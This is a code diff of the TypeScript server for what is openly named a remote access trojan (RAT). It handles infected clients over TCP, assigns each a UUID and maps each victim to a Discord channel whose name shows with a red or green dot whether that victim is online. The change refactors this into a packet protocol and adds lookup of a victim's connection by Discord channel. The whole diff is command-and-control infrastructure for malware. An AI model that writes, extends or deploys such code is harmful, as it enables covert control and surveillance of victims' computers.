@@ -2,7 +2,8 @@ import {createServer, Server, Socket} from 'net';
 import CustomClient from './CustomClient';
 import ITCPServer from "../interfaces/IRATServer";
 import RATClient from './RATClient';
-import { ChannelType, TextChannel } from 'discord.js';
+import TextChannel from 'discord.js';
+import Code from '../enums/Codes';
 
 export default class RATServer implements ITCPServer {
     client: CustomClient;
@@ -30,80 +31,33 @@ export default class RATServer implements ITCPServer {
             let client = new RATClient(socket, this, '');
             this.ratClients.push(client);
 
-            let data = await client.receive();
-            // if first time client connects, create a new user
-            if (data == 0) {
-                const user = await this.client.database.user.create({
-                    data: {
-                        channelId: null
-                    }
-                });
-                client.send(user.uuid);
-                // Create a channel in a category using category ID
-                const guild = this.client.guilds.cache.get(this.client.config.guildId) || null;
-                if (!guild) {
-                    console.log(`Guild with ID ${this.client.config.guildId} not found`);
-                    return;
-                }
-                const channel = await guild.channels.create({
-                    name: `🔴${user.uuid}`,
-                    type: ChannelType.GuildText,
-                    parent: this.client.config.categoryId
-                });
-                // set the user's channel ID
-                await this.client.database.user.update({
-                    where: {
-                        uuid: user.uuid
-                    },
-                    data: {
-                        channelId: channel.id
-                    }
-                });
-                client.disconnect();
-                return;
-            }
-            let dataString = data as string;
-            
-            if (dataString.split(';')[0] !== '1') {
+            let packet = await client.receive();
+            if (!packet) {
                 console.log('Invalid data received');
                 client.disconnect();
                 return;
             }
-            
-            const uuid = dataString.split(';')[1];
-            client.uuid = uuid;
-            const user = await this.client.database.user.findUnique({
-                where: {
-                    uuid: uuid
+            // if first time client connects, initiates first time connection
+            if (packet?.code === Code.ASK_UUID) {
+                client.firstTimeConnect();
+                return;
+            } else if (packet?.code === Code.AUTH_UUID) {
+
+                if (packet.length !== 36) {
+                    console.log('Invalid data received');
+                    client.disconnect();
+                    return;
                 }
-            });
-            if (!user) {
-                console.log(`User with UUID ${uuid} not found`);
-                client.disconnect();
+                if (!packet.payload) {
+                    console.log('Invalid data received');
+                    client.disconnect();
+                    return;
+                }
+
+                const uuid = packet.payload.toString();
+                client.connect(uuid);
                 return;
             }
-
-            // change the user's connected status to true
-            await this.client.database.user.update({
-                where: {
-                    uuid: uuid
-                },
-                data: {
-                    connected: true
-                }
-            });
-            
-            // change the channel name to green
-            //@ts-ignore
-            let channel = this.client.channels.cache.get(user.channelId) as TextChannel;
-            if (!channel) {
-                //@ts-ignore
-                channel = await this.client.channels.fetch(user.channelId) as TextChannel;
-                if (!channel) {
-                    return;
-                }               
-            }
-            await channel.setName(`🟢${channel.name.substring(2, channel.name.length)}`);
         });
     }
     
@@ -113,6 +67,19 @@ export default class RATServer implements ITCPServer {
 
     isListening(): boolean {
         return this.started;
+    }
+
+    async getClientByChannelId(channelId: string): Promise<RATClient | undefined> {
+        const user = await this.client.database.user.findFirstOrThrow({
+            where: {
+                channelId: channelId
+            }
+        });
+        const RATClient = this.client.ratServer.ratClients.find(client => client.uuid == user.uuid);
+        if (!RATClient) {
+            return undefined;
+        }
+        return RATClient;
     }
 
     async removeClient(client: RATClient): Promise<void> {
